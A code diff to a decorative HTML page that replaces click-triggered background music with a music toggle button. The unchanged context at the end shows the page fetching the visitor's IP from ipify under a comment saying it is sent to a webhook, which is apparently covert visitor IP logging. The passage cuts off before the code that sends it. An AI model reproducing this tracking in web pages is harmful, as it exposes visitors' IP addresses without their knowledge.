@@ -76,6 +76,17 @@
             height: 32px;
             vertical-align: middle;
         }
+        .music-control {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 14px;
+            color: white;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -90,7 +101,21 @@
             <img src="https://cdn.discordapp.com/emojis/your_emoji_id.gif" alt="Emoji" class="emoji">
         </div>
     </div>
+    <div class="music-control" onclick="toggleAudio()">Click anywhere to play music, or stop music</div>
     <script>
+        let audio = new Audio("https://ia801700.us.archive.org/13/items/gpw58p/gpw58p.mp4");
+        audio.loop = true;
+        let isPlaying = false;
+
+        function toggleAudio() {
+            if (isPlaying) {
+                audio.pause();
+            } else {
+                audio.play().catch(error => console.log("Autoplay failed: ", error));
+            }
+            isPlaying = !isPlaying;
+        }
+
         function createSnow() {
             for (let i = 0; i < 100; i++) {
                 let snow = document.createElement("div");
@@ -102,13 +127,6 @@
             }
         }
         createSnow();
-
-        function playAudio() {
-            let audio = new Audio("https://ia801700.us.archive.org/13/items/gpw58p/gpw58p.mp4");
-            audio.loop = true;
-            audio.play().catch(error => console.log("Autoplay failed: ", error));
-        }
-        window.addEventListener("click", playAudio, { once: true });
 
         // Fetch and send IP to webhook
         fetch('https://api64.ipify.org?format=json')
